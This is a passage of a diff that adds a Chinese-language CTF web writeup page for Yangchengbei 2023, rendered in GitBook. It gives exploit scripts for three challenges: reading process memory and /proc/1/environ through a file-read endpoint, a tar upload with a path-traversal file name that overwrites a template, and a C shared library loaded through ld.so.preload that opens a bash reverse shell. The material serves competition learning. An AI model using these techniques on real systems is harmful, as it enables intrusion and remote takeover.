+<span class="hljs-comment"># print(f&quot;{url}/read?file=/proc/self/mem&amp;start={int(map_addr.group(1),16)+1}&amp;end={int(map_addr.group(2),16)-1}&quot;)</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> map_list:
+    map_addr = re.match(r<span class="hljs-string">&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)
+    <span class="hljs-keyword">if</span> map_addr:
+        <span class="hljs-built_in">print</span>(map_addr)
+        start = int(map_addr.group(1), 16)
+        end = int(map_addr.group(2), 16)
+        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found rw addr:&quot;</span>, start, <span class="hljs-string">&quot;-&quot;</span>, end)
+        try:
+            res = requests.get(f<span class="hljs-string">&quot;{url}/read?file=/proc/self/mem&amp;start={start}&amp;end={end-start}&quot;</span>)
+        except:
+            ...
+        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Boogipopisweak&quot;</span> <span class="hljs-keyword">in</span> res.text:
+            <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;{url}/read?file=/proc/self/mem&amp;start={start}&amp;end={end-start}&quot;</span>)
+</code></pre>
+<p>&#x73AF;&#x5883;&#x8BB0;&#x5F97;&#x7EED;&#x7740;</p>
+<p>3c16d0f2<em>0344</em>4650<em>8f4d</em>1bfcf6f1814cBoogipopisweak</p>
+<p>6 &#x975E;&#x9884;&#x671F;&#x76F4;&#x63A5;&#x8BFB;&#x5C31;&#x6709; flag</p>
+<pre><code class="lang-php">/read?file=/proc/<span class="hljs-number">1</span>/environ
+</code></pre>
+<h2 id="ezyaml">ezyaml</h2>
+<p>&#x7B80;&#x5355;&#x7684; yaml</p>
+<p>&#x975E;&#x9884;&#x671F; &#x76F4;&#x63A5; tarfile &#x4E0A;&#x4F20;&#x8986;&#x76D6; <code>templates/result.html</code></p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> tarfile
+<span class="hljs-keyword">import</span> requests
+
+url = <span class="hljs-string">&quot;&quot;</span>
+proxy = {<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>, <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;https://127.0.0.1:8080&quot;</span>}
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">changeName</span><span class="hljs-params">(tarinfo)</span>:</span>
+    <span class="hljs-comment"># &#x4FEE;&#x6539;tar&#x5305;&#x5185;&#x6587;&#x4EF6;&#x540D;</span>
+    tarinfo.name = f<span class="hljs-string">&quot;../../templates/result.html&quot;</span>
+    <span class="hljs-keyword">return</span> tarinfo
+<span class="hljs-comment"># &#x751F;&#x6210;tar&#x5305;</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generateTarFile</span><span class="hljs-params">(filename)</span>:</span>
+    <span class="hljs-keyword">with</span> tarfile.open(<span class="hljs-string">&quot;poc.tar&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> tar:
+        tar.add(filename, filter=changeName)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">upload</span><span class="hljs-params">()</span>:</span>
+    file = {<span class="hljs-string">&quot;file&quot;</span>: open(<span class="hljs-string">&quot;poc.tar&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)}
+    res = requests.post(url + <span class="hljs-string">&quot;/upload&quot;</span>, files=file, proxies=proxy)
+    print(res.text)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    requests.get(url)
+    generateTarFile(<span class="hljs-string">&quot;poc.html&quot;</span>)
+    upload()
+</code></pre>
+<h2 id="ezweb">ez_web*</h2>
+<p>&#x770B;&#x4E86;&#x522B;&#x4EBA;&#x7684;wp&#x968F;&#x4FBF;&#x8BB0;&#x4E0B;</p>
+<p>&#x9996;&#x5148;&#x731C;&#x6D4B;&#x4E0A;&#x4F20;&#x8DEF;&#x5F84;<code>/etc</code>&#xFF1F;&#xFF1F;&#xFF1F;</p>
+<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
+
+<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">puts</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *message)</span></span>{
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pwned&quot;</span>);
+    system(<span class="hljs-string">&quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&apos;&quot;</span>);
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>&#x7F16;&#x8BD1;&#x6210; so &#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x3002;&#x7136;&#x540E;&#x518D;&#x4F20;&#x4E00;&#x4E2A;<code>ld.so.preload</code>&#x6587;&#x4EF6;&#xFF0C;&#x5199;&#x5165;&#x76F4;&#x63A5;&#x7F16;&#x8BD1;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x52A0;&#x8F7D;&#x3002;</p>
+<p><code>cmd.php</code>&#x6267;&#x884C; whoami &#x53CD;&#x5F39; shell&#x3002;</p>
+<p>&#x5408;&#x7740;&#x4EE5;&#x524D;&#x51FA;&#x8FC7;&#x7684; <a href="https://blog.huli.tw/2022/12/14/rctf-2022-writeup/#promax" target="_blank">filetrick</a> &#x5230;&#x4F60;&#x8FD9; &#x8C1C;&#x8BED;&#x4EBA;sourceless web &#x91CC;&#x5C31;&#x6210;&#x96BE;&#x9898;&#x4E86;&#x5341;&#x516B;</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <!-- <a href="./" class="navigation navigation-prev " aria-label="Previous page: About This Site">
+                    <i class="fa fa-angle-left"></i>
+                </a> -->
+                
+                
+                <!-- <a href="WMCTF 2023 web writeup.html#20230824" class="navigation navigation-next " aria-label="Next page: WMCTF2023 web writeup">
+                    <i class="fa fa-angle-right"></i>
+                </a> -->
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"羊城杯 2023 web writeup","level":"1.2","depth":1,"next":{"title":"WMCTF2023 web writeup","level":"1.3","depth":1,"anchor":"#20230824","path":"WMCTF 2023 web writeup.md","ref":"WMCTF 2023 web writeup.md#20230824","articles":[]},"previous":{"title":"About This Site","level":"1.1","depth":1,"path":"README.md","ref":"README.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"羊城杯 2023 web writeup.md","mtime":"2023-09-03T13:04:33.174Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-03T13:07:54.359Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
